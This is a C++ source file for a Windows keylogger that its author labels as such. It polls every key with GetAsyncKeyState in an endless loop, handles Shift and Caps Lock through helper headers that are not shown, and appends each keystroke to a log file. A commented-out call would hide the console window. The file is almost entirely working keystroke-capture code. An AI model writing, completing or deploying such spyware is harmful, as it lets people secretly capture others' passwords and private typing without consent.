/*
*    ``~ Main file for the keylogger program (Written by haeoro) ~``
*
*    WinMain() initializes all mappings, checks if any key on the keyboard is being pressed.
*    once a key's value has been found and written to a file, key = 0 tells the program that the key has been found
*    and logged, and that it should continue checking other keys to see if they're being pressed. 
*
*    writeKeyStroke() takes an int key argument, then converts that integer to it's corresponding ascii value using 
*    static_cast conversion method, then closes the file.
*/

#include "mappings.h"
#include "constants.h"
#include "find_shift_keys.h"

#include <windows.h>
#include <iostream>
#include <fstream>

void writeKeyStroke(int trueKey)
{
    std::ofstream file;
    file.open("logs.txt", std::ios::app);
        
    if (trueKey == ENTER)
    {
        file << "\n";
    }
    else
    {
        file << static_cast<char>(trueKey);
    }
    file.close();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PSTR lpCmdLine, int nCmdShow)
{
    //FreeConsole();
    Maps vkMaps;
    vkMaps.initializeMaps();
    while (1)
    {
        for (int i = 1; i < 254; i++)
        {
            int key = GetAsyncKeyState(i);
            while (key == KEY_IS_PRESSED && i != 16)
            {
                int specialKey = vkMaps.searchAsciiMaps(i);
                if (isShiftPressed() == 1) 
                {
                    writeKeyStroke(findShiftPlusKey());
                }
                else if (vkMaps.searchMiscMaps(i) != 1) 
                {
                    key = 0;
                }
                else if (vkMaps.searchAsciiMaps(i) != 1) 
                {
                    writeKeyStroke(specialKey);
                }
                else 
                {
                    int getCapOrLowKey = isCapslockOn(i);
                    writeKeyStroke(getCapOrLowKey);
                }
                key = 0;
            }
        }
    }
}